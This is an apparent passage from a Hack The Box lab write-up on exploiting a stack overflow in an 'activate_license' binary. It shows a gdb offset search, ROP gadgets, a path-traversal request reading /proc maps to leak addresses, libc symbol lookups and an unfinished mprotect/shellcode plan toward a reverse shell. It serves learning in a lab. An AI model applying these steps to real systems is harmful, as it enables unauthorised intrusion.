+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> activated license: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaaaaaanaaaaaaaoaaaaaaapaaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabdaaaaaabeaaaaaabfaaaaaabgaaaaaabhaaaaaabiaaaaaabjaaaaaabkaaaaaablaaaaaabmaaaaaabnaaaaaaboaaaaaabpaaaaaabqaaaaaabraaaaaabsaaaaaabtaaaaaabuaaaaaabvaaaaaabwaaaaaabxaaaaaabyaaaaaabzaaaaaacbaaaaaaccaaaaaacdaaaaaaceaaaaaacfaaaaaacgaaaaaachaaaaaaciaaaaaacjaaaaaackaaaaaaclaaaaaacmaaaaaacnaaaaaacoaaaaaacpaaaaaacqaaaaaacraaaaaacsaaaaaBBBBBBBB
+
+Thread 4.1 <span style="color:#e6db74">&#34;activateLicense&#34;</span> received signal SIGSEGV, Segmentation fault.
+<span style="color:#f92672">[</span>Switching to Thread 0x7ffff7b1e0c0 <span style="color:#f92672">(</span>LWP 19199<span style="color:#f92672">)]</span>
+0x00005555555555c0 in activate_license <span style="color:#f92672">(</span>sockfd<span style="color:#f92672">=</span>4<span style="color:#f92672">)</span> at activate_license.c:64
+<span style="color:#ae81ff">64</span>      in activate_license.c
+
+
+<span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/s $rsp
+0x7fffffffdeb8: <span style="color:#e6db74">&#34;paaaaaacqaaaaaacraaaaaacsaaaaaBBBBBBBB&#34;</span>
+
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gef➤  pattern search paaaaaacqaaaaaacraaaaaacsaaaaa
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Searching <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;paaaaaacqaaaaaacraaaaaacsaaaaa&#39;</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Found at offset <span style="color:#ae81ff">520</span> <span style="color:#f92672">(</span>big-endian search<span style="color:#f92672">)</span>
+</code></pre></div><p><strong>Offset found at 520</strong></p>
+<h2 id="overview-of-exploit">Overview of exploit<a href="#overview-of-exploit" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>We want to gain code execution to gain a reverse shell on the machine. We are assuming ASLR is enabled, plus we don&rsquo;t have the base address in the first place for the binary. Therefore we will need to find a way to leak this address. This is possible through enumeration of /proc.</p>
+<p><strong>show here</strong></p>
+<p>In order to gain code execution we will want to use a syscall such as sys_execve(). This will need to be passed arguments such as <code>/bin/sh</code> or our reverse shell payload. To do this we can pass arguments to the stack in registers.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#a6e22e">buf</span> <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">pop</span> <span style="color:#66d9ef">rsi</span><span style="color:#75715e">; ret
+</span><span style="color:#75715e"></span><span style="color:#66d9ef">buf</span> <span style="color:#960050;background-color:#1e0010">+=</span> <span style="color:#960050;background-color:#1e0010">&#34;/</span><span style="color:#66d9ef">bin</span><span style="color:#960050;background-color:#1e0010">&#34;</span>
+</code></pre></div><p>We can only pass 4 bytes at a time so this is how we would pass /bin to the <code>rsi</code> register.</p>
+<pre tabindex="0"><code>Payload = &quot;A&quot;*520 + &quot;pop rdi;ret&quot; + &quot;/bin/sh&quot; + 
+</code></pre><h2 id="finding-gadgets">Finding gadgets<a href="#finding-gadgets" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/HackTheBox/retired<span style="color:#f92672">]</span>
+└─$ cat gadgets.txt| grep pop | grep <span style="color:#e6db74">&#34;ret</span>$<span style="color:#e6db74">&#34;</span>
+0x00000000000012ed : add byte ptr <span style="color:#f92672">[</span>rcx<span style="color:#f92672">]</span>, al ; pop rbp ; ret
+0x00000000000012e8 : mov byte ptr <span style="color:#f92672">[</span>rip + 0x2d21<span style="color:#f92672">]</span>, <span style="color:#ae81ff">1</span> ; pop rbp ; ret
+0x0000000000001814 : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x0000000000001816 : pop r13 ; pop r14 ; pop r15 ; ret
+0x0000000000001818 : pop r14 ; pop r15 ; ret
+0x000000000000181a : pop r15 ; ret
+0x0000000000001813 : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
+0x0000000000001817 : pop rbp ; pop r14 ; pop r15 ; ret
+0x00000000000012ef : pop rbp ; ret
+0x000000000000181b : pop rdi ; ret
+0x0000000000001819 : pop rsi ; pop r15 ; ret
+0x0000000000001815 : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
+</code></pre></div><h2 id="leaking-base-address">Leaking base address<a href="#leaking-base-address" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">GET /index.php?page=../../../../../../../../../../../../proc/411/maps HTTP/1.1
+Host: 10.10.11.154
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">HTTP/1.1 302 Found
+Server: nginx
+Date: Mon, 06 Jun 2022 11:04:07 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+Location: /index.php?page=default.html
+Content-Length: 4593
+
+55f164dc7000-55f164dc8000 r--p 00000000 08:01 2408  &lt;<span style="color:#f92672">--</span> <span style="color:#a6e22e">one</span> <span style="color:#a6e22e">were</span> <span style="color:#a6e22e">after</span>   <span style="color:#960050;background-color:#1e0010">/</span><span style="color:#a6e22e">usr</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#a6e22e">bin</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#a6e22e">activate_license</span>
+<span style="color:#a6e22e">55f164dc8000-55f164dc9000</span> <span style="color:#a6e22e">r-xp</span> <span style="color:#a6e22e">00001000</span> <span style="color:#a6e22e">08:01</span> <span style="color:#a6e22e">2408</span>                       <span style="color:#960050;background-color:#1e0010">/</span><span style="color:#a6e22e">usr</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#a6e22e">bin</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#a6e22e">activate_license</span>
+<span style="color:#a6e22e">55f164dc9000-55f164dca000</span> <span style="color:#a6e22e">r--p</span> <span style="color:#a6e22e">00002000</span> <span style="color:#a6e22e">08:01</span> <span style="color:#a6e22e">2408</span>                       <span style="color:#960050;background-color:#1e0010">/</span><span style="color:#a6e22e">usr</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#a6e22e">bin</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#a6e22e">activate_license</span>
+<span style="color:#a6e22e">55f164dca000-55f164dcb000</span> <span style="color:#a6e22e">r--p</span> <span style="color:#a6e22e">00002000</span> <span style="color:#a6e22e">08:01</span> <span style="color:#a6e22e">2408</span>                       <span style="color:#960050;background-color:#1e0010">/</span><span style="color:#a6e22e">usr</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#a6e22e">bin</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#a6e22e">activate_license</span>
+<span style="color:#a6e22e">55f164dcb000-55f164dcc000</span> <span style="color:#a6e22e">rw-p</span> <span style="color:#a6e22e">00003000</span> <span style="color:#a6e22e">08:01</span> <span style="color:#a6e22e">2408</span>                       <span style="color:#960050;background-color:#1e0010">/</span><span style="color:#a6e22e">usr</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#a6e22e">bin</span><span style="color:#960050;background-color:#1e0010">/</span><span style="color:#a6e22e">activate_license</span>
+<span style="color:#a6e22e">55f165556000-55f165577000</span> <span style="color:#a6e22e">rw-p</span> <span style="color:#a6e22e">00000000</span> <span style="color:#a6e22e">00:00</span> <span style="color:#a6e22e">0</span>
+</code></pre></div><h2 id="getting-offsets">Getting offsets<a href="#getting-offsets" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
+<p>This is for a ret2libc attack</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ strings -t x /usr/lib/x86_64-linux-gnu/libc-2.31.so | grep /bin/sh
+$ readelf -s /usr/lib/x86_64-linux-gnu/libc-2.31.so | grep system
+$ readelf -s /usr/lib/x86_64-linux-gnu/libc-2.31.so | grep exit
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ readelf -s /usr/lib/x86_64-linux-gnu/libc-2.31.so | grep mprotect
+  1225: 00000000001189a0    <span style="color:#ae81ff">37</span> FUNC    WEAK   DEFAULT   <span style="color:#ae81ff">15</span> mprotect@@GLIBC_2.2.5
+  
+
+$ readelf -s /usr/lib/x86_64-linux-gnu/libc-2.31.so | grep memcpy
+  
+  1197: 00000000000a0950   <span style="color:#ae81ff">183</span> IFUNC   GLOBAL DEFAULT   <span style="color:#ae81ff">15</span> memcpy@@GLIBC_2.14
+  1199: 00000000000bbad0    <span style="color:#ae81ff">44</span> FUNC    GLOBAL DEFAULT   <span style="color:#ae81ff">15</span> memcpy@GLIBC_2.2.5
+ 
+
+</code></pre></div><h1 id="making-stack-executable-again">Making stack executable again<a href="#making-stack-executable-again" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">thomas@thomas-XPS-15-9510:~/Documents$ strace ./activateLicense.exe <span style="color:#ae81ff">9001</span>              
+execve<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;./activateLicense.exe&#34;</span>, <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;./activateLicense.exe&#34;</span>, <span style="color:#e6db74">&#34;9001&#34;</span><span style="color:#f92672">]</span>, 0x7ffe74f48768 /* <span style="color:#ae81ff">5</span>
+<span style="color:#ae81ff">3</span> vars */<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>                                                                        
+brk<span style="color:#f92672">(</span>NULL<span style="color:#f92672">)</span>                               <span style="color:#f92672">=</span> 0x558699e48000                              
+arch_prctl<span style="color:#f92672">(</span>0x3001 /* ARCH_??? */, 0x7ffee197f950<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> -1 EINVAL <span style="color:#f92672">(</span>Invalid argument<span style="color:#f92672">)</span>      
+access<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;/etc/ld.so.preload&#34;</span>, R_OK<span style="color:#f92672">)</span>      <span style="color:#f92672">=</span> -1 ENOENT <span style="color:#f92672">(</span>No such file or directory<span style="color:#f92672">)</span>       
+openat<span style="color:#f92672">(</span>AT_FDCWD, <span style="color:#e6db74">&#34;/etc/ld.so.cache&#34;</span>, O_RDONLY|O_CLOEXEC<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>                          
+fstat<span style="color:#f92672">(</span>3, <span style="color:#f92672">{</span>st_mode<span style="color:#f92672">=</span>S_IFREG|0644, st_size<span style="color:#f92672">=</span>85230, ...<span style="color:#f92672">})</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>                              
+mmap<span style="color:#f92672">(</span>NULL, 85230, PROT_READ, MAP_PRIVATE, 3, 0<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0x7f515b6e2000                      
+close<span style="color:#f92672">(</span>3<span style="color:#f92672">)</span>                                <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>                                           
+openat<span style="color:#f92672">(</span>AT_FDCWD, <span style="color:#e6db74">&#34;/lib/x86_64-linux-gnu/libsqlite3.so.0&#34;</span>, O_RDONLY|O_CLOEXEC<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>     
+read<span style="color:#f92672">(</span>3, <span style="color:#e6db74">&#34;\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0&gt;\0\1\0\0\0\0\346\0\0\0\0\0\0&#34;</span>..., 832<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 
+<span style="color:#ae81ff">832</span>                                                                                   
+fstat<span style="color:#f92672">(</span>3, <span style="color:#f92672">{</span>st_mode<span style="color:#f92672">=</span>S_IFREG|0644, st_size<span style="color:#f92672">=</span>1212216, ...<span style="color:#f92672">})</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>                            
+mmap<span style="color:#f92672">(</span>NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0x7f515b6e0
+<span style="color:#ae81ff">000</span>                                                                                   
+mmap<span style="color:#f92672">(</span>NULL, 1216056, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0x7f515b5b7000      
+mprotect<span style="color:#f92672">(</span>0x7f515b5c5000, 1134592, PROT_NONE<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>                                      
+mmap<span style="color:#f92672">(</span>0x7f515b5c5000, 917504, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE,
+ 3, 0xe000<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0x7f515b5c5000                                                          
+mmap<span style="color:#f92672">(</span>0x7f515b6a5000, 212992, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0xee00
+0<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0x7f515b6a5000                                                                   
+mmap<span style="color:#f92672">(</span>0x7f515b6da000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE,
+ 3, 0x122000<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> 0x7f515b6da000                                                        
+close<span style="color:#f92672">(</span>3<span style="color:#f92672">)</span>                                <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>                                           
+openat<span style="color:#f92672">(</span>AT_FDCWD, <span style="color:#e6db74">&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span>, O_RDONLY|O_CLOEXEC<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">3</span>           
+read<span style="color:#f92672">(</span>3, <span style="color:#e6db74">&#34;\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0&gt;\0\1\0\0\0\300A\2\0\0\0\0\0&#34;</span>..., 832<span style="color:#f92672">)</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">8</span>
+<span style="color:#ae81ff">32</span>
+
+</code></pre></div><p>mmap and mprotect. INteresting functions, why are they called when our executable is run? FIrst lets figure out what they do</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">MMAP(<span style="color:#ae81ff">2</span>)                      Linux Programmer<span style="color:#960050;background-color:#1e0010">&#39;</span>s Manual                      MMAP(<span style="color:#ae81ff">2</span>)
+
+NAME
+       mmap, munmap <span style="color:#f92672">-</span> map or unmap files or devices into memory
+
+SYNOPSIS
+       <span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/mman.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+       <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>mmap(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>addr, size_t length, <span style="color:#66d9ef">int</span> prot, <span style="color:#66d9ef">int</span> flags,
+                  <span style="color:#66d9ef">int</span> fd, off_t offset);
+       <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">munmap</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>addr, size_t length);
+
+       See NOTES <span style="color:#66d9ef">for</span> information on feature test macro requirements.
+
+DESCRIPTION
+       mmap()  creates  a  new  mapping in the virtual address space of the calling
+       process.  The starting address <span style="color:#66d9ef">for</span> the new mapping  is  specified  in  addr.
+       The  length  argument  specifies  the  length  of the mapping (which must be
+       greater than <span style="color:#ae81ff">0</span>).
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">MPROTECT(<span style="color:#ae81ff">2</span>)                  Linux Programmer<span style="color:#960050;background-color:#1e0010">\&#39;</span>s Manual                  MPROTECT(<span style="color:#ae81ff">2</span>)
+
+NAME
+       mprotect, pkey_mprotect <span style="color:#f92672">-</span> set protection on a region of memory
+
+SYNOPSIS
+       <span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/mman.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+       <span style="color:#66d9ef">int</span> mprotect(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>addr, size_t len, <span style="color:#66d9ef">int</span> prot);
+
+       <span style="color:#75715e">#define _GNU_SOURCE             </span><span style="color:#75715e">/* See feature_test_macros(7) */</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>       <span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;sys/mman.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+       <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">pkey_mprotect</span>(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>addr, size_t len, <span style="color:#66d9ef">int</span> prot, <span style="color:#66d9ef">int</span> pkey);
+
+DESCRIPTION
+       mprotect()  changes  the access protections <span style="color:#66d9ef">for</span> the calling process<span style="color:#960050;background-color:#1e0010">\&#39;</span>s memory
+       pages  containing  any  part  of  the  address   range   in   the   interval
+       [addr, addr<span style="color:#f92672">+</span>len<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>].  addr must be aligned to a page boundary.
+
+</code></pre></div><p>So mmap, generates a new section of memory at an address specified in the system call and mprotect sets the privileges for this section of memory.</p>
+<p>This sounds interesting, what if we were able to assign a new area of memory somewhere, and assign it execute permissions. With this, we would be able to store out shellcode, redirect execution flow to this area of memory which would end up being executed.</p>
+<blockquote>
+<p>One caveat with <code>mprotect</code> is that it must be aligned with with the page boundary.
+<em>A page is the smallest unit of data for memory management in a virtual memory operating system.</em>
+<em>A page frame is the smallest fixed-length contiguous block of physical memory into which memory pages are mapped by the operating system.</em></p>
+</blockquote>
+<p>If were wondering what a page boundary is and why its important, we can take a look in <code>gdb</code> of a running executable.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">gdb-peda$ vmmap
+Start      End        Perm Name
+0x56555000 0x56556000 r-xp /home/virtual/a.out
+0x56556000 0x56557000 r--p /home/virtual/a.out
+0x56557000 0x56558000 rw-p /home/virtual/a.out
+0x56558000 0x5655b000 rw-p <span style="color:#f92672">[</span>heap<span style="color:#f92672">]</span>
+0x5655b000 0x5655c000 r--p <span style="color:#f92672">[</span>heap<span style="color:#f92672">]</span>    
+0x5655c000 0x5657a000 rw-p <span style="color:#f92672">[</span>heap<span style="color:#f92672">]</span>
+0xf7de6000 0xf7fb2000 r-xp /lib32/libc-2.26.so
+0xf7fb2000 0xf7fb3000 ---p /lib32/libc-2.26.so
+0xf7fb3000 0xf7fb5000 r--p /lib32/libc-2.26.so
+0xf7fb5000 0xf7fb6000 rw-p /lib32/libc-2.26.so
+0xf7fb6000 0xf7fb9000 rw-p mapped
+0xf7fd0000 0xf7fd2000 rw-p mapped
+0xf7fd2000 0xf7fd5000 r--p <span style="color:#f92672">[</span>vvar<span style="color:#f92672">]</span>
+0xf7fd5000 0xf7fd7000 r-xp <span style="color:#f92672">[</span>vdso<span style="color:#f92672">]</span>
+0xf7fd7000 0xf7ffc000 r-xp /lib32/ld-2.26.so
+0xf7ffc000 0xf7ffd000 r--p /lib32/ld-2.26.so
+0xf7ffd000 0xf7ffe000 rw-p /lib32/ld-2.26.so
+0xfffdd000 0xffffe000 rw-p <span style="color:#f92672">[</span>stack<span style="color:#f92672">]</span>
+</code></pre></div><p>The <code>start</code> and <code>end</code> sections highlight the start address and end address of different areas of the virtual memory for this process. Notice the next area of memory starts just after the previous finishes. This is is page boundary. If these aren&rsquo;t aligned like this you&rsquo;re fucked.</p>
+<p>Right, back to the plan. We want to generate a new area of memory in the current virtual address space which is writable and executable. Once we have completed this we will need to move our shellcode from the stack to this section of memory. a function called <code>memcpy</code> can be used to achieve this.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">memcpy <span style="color:#f92672">-</span> copy memory area
+
+SYNOPSIS
+       <span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span>
+       <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>memcpy(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>dest, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>src, size_t n);
+
+DESCRIPTION
+       The memcpy() function copies n bytes from memory area src to memory area dest.
+</code></pre></div><p>Because this is 64 bit arguments for functions need to be passed into registers on the stack. The order in which this happens is it is the <code>rdi</code> register first, then <code>rsi</code>, <code>rdx</code>, <code>rcx</code>, <code>r8</code> and <code>r9</code>. Therefore, out destination will need to be stored in the <code>rdi</code> register, the <code>src</code> in the <code>rsi</code> register, and the size in the <code>rdx</code> register.</p>
+<p>Looking at the memory mappings for the binary we need to choose a destination memory section to write our shellcode to. We need to choose an area of memory that the process wont use. Alternatively we could use gadgets from libc to memallocate a whole new section of memory but we won&rsquo;t cover that today.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">55555554000-555555555000 r--p <span style="color:#ae81ff">00000000</span> fd:01 <span style="color:#ae81ff">16910391</span>                   /home/thomas/Documents/activateLicense.exe
+555555555000-555555556000 r-xp <span style="color:#ae81ff">00001000</span> fd:01 <span style="color:#ae81ff">16910391</span>                   /home/thomas/Documents/activateLicense.exe
+555555556000-555555557000 r--p <span style="color:#ae81ff">00002000</span> fd:01 <span style="color:#ae81ff">16910391</span>                   /home/thomas/Documents/activateLicense.exe
+555555557000-555555558000 r--p <span style="color:#ae81ff">00002000</span> fd:01 <span style="color:#ae81ff">16910391</span>                   /home/thomas/Documents/activateLicense.exe
+555555558000-555555559000 rw-p <span style="color:#ae81ff">00003000</span> fd:01 <span style="color:#ae81ff">16910391</span>                   /home/thomas/Documents/activateLicense.exe
+7ffff7b1d000-7ffff7b1f000 rw-p <span style="color:#ae81ff">00000000</span> 00:00 <span style="color:#ae81ff">0</span> 
+7ffff7b1f000-7ffff7b20000 r--p <span style="color:#ae81ff">00000000</span> fd:01 <span style="color:#ae81ff">23857469</span>                   /usr/lib/x86_64-linux-gnu/libdl-2.31.so
+7ffff7b20000-7ffff7b22000 r-xp <span style="color:#ae81ff">00001000</span> fd:01 <span style="color:#ae81ff">23857469</span>                   /usr/lib/x86_64-linux-gnu/libdl-2.31.so
+7ffff7b22000-7ffff7b23000 r--p <span style="color:#ae81ff">00003000</span> fd:01 <span style="color:#ae81ff">23857469</span>                   /usr/lib/x86_64-linux-gnu/libdl-2.31.so
+7ffff7b23000-7ffff7b24000 r--p <span style="color:#ae81ff">00003000</span> fd:01 <span style="color:#ae81ff">23857469</span>                   /usr/lib/x86_64-linux-gnu/libdl-2.31.so
+7ffff7b24000-7ffff7b25000 rw-p <span style="color:#ae81ff">00004000</span> fd:01 <span style="color:#ae81ff">23857469</span>                   /usr/lib/x86_64-linux-gnu/libdl-2.31.so
+7ffff7b25000-7ffff7b2b000 r--p <span style="color:#ae81ff">00000000</span> fd:01 <span style="color:#ae81ff">23857481</span>                   /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
+7ffff7b2b000-7ffff7b3c000 r-xp <span style="color:#ae81ff">00006000</span> fd:01 <span style="color:#ae81ff">23857481</span>                   /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
+7ffff7b3c000-7ffff7b42000 r--p <span style="color:#ae81ff">00017000</span> fd:01 <span style="color:#ae81ff">23857481</span>                   /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
+7ffff7b42000-7ffff7b43000 r--p 0001c000 fd:01 <span style="color:#ae81ff">23857481</span>                   /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
+7ffff7b43000-7ffff7b44000 rw-p 0001d000 fd:01 <span style="color:#ae81ff">23857481</span>                   /usr/lib/x86_64-linux-gnu/libpthread-2.31.so
+7ffff7b44000-7ffff7b48000 rw-p <span style="color:#ae81ff">00000000</span> 00:00 <span style="color:#ae81ff">0</span> 
+7ffff7b48000-7ffff7b55000 r--p <span style="color:#ae81ff">00000000</span> fd:01 <span style="color:#ae81ff">23857470</span>                   /usr/lib/x86_64-linux-gnu/libm-2.31.so
+7ffff7b55000-7ffff7bfc000 r-xp 0000d000 fd:01 <span style="color:#ae81ff">23857470</span>                   /usr/lib/x86_64-linux-gnu/libm-2.31.so
+7ffff7bfc000-7ffff7c95000 r--p 000b4000 fd:01 <span style="color:#ae81ff">23857470</span>                   /usr/lib/x86_64-linux-gnu/libm-2.31.so
+7ffff7c95000-7ffff7c96000 r--p 0014c000 fd:01 <span style="color:#ae81ff">23857470</span>                   /usr/lib/x86_64-linux-gnu/libm-2.31.so
+7ffff7c96000-7ffff7c97000 rw-p 0014d000 fd:01 <span style="color:#ae81ff">23857470</span>                   /usr/lib/x86_64-linux-gnu/libm-2.31.so
+7ffff7c97000-7ffff7cb9000 r--p <span style="color:#ae81ff">00000000</span> fd:01 <span style="color:#ae81ff">23857460</span>                   /usr/lib/x86_64-linux-gnu/libc-2.31.so
+7ffff7cb9000-7ffff7e31000 r-xp <span style="color:#ae81ff">00022000</span> fd:01 <span style="color:#ae81ff">23857460</span>                   /usr/lib/x86_64-linux-gnu/libc-2.31.so
+7ffff7e31000-7ffff7e7f000 r--p 0019a000 fd:01 <span style="color:#ae81ff">23857460</span>                   /usr/lib/x86_64-linux-gnu/libc-2.31.so
+7ffff7e7f000-7ffff7e83000 r--p 001e7000 fd:01 <span style="color:#ae81ff">23857460</span>                   /usr/lib/x86_64-linux-gnu/libc-2.31.so
+7ffff7e83000-7ffff7e85000 rw-p 001eb000 fd:01 <span style="color:#ae81ff">23857460</span>                   /usr/lib/x86_64-linux-gnu/libc-2.31.so
+7ffff7e85000-7ffff7e89000 rw-p <span style="color:#ae81ff">00000000</span> 00:00 <span style="color:#ae81ff">0</span> 
+7ffff7e89000-7ffff7e97000 r--p <span style="color:#ae81ff">00000000</span> fd:01 <span style="color:#ae81ff">23858740</span>                   /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
+7ffff7e97000-7ffff7f77000 r-xp 0000e000 fd:01 <span style="color:#ae81ff">23858740</span>                   /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
+7ffff7f77000-7ffff7fab000 r--p 000ee000 fd:01 <span style="color:#ae81ff">23858740</span>                   /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
+7ffff7fab000-7ffff7fac000 ---p <span style="color:#ae81ff">00122000</span> fd:01 <span style="color:#ae81ff">23858740</span>                   /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
+7ffff7fac000-7ffff7faf000 r--p <span style="color:#ae81ff">00122000</span> fd:01 <span style="color:#ae81ff">23858740</span>                   /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
+7ffff7faf000-7ffff7fb2000 rw-p <span style="color:#ae81ff">00125000</span> fd:01 <span style="color:#ae81ff">23858740</span>                   /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
+7ffff7fb2000-7ffff7fb4000 rw-p <span style="color:#ae81ff">00000000</span> 00:00 <span style="color:#ae81ff">0</span> 
+7ffff7fc9000-7ffff7fcd000 r--p <span style="color:#ae81ff">00000000</span> 00:00 <span style="color:#ae81ff">0</span>                          <span style="color:#f92672">[</span>vvar<span style="color:#f92672">]</span>
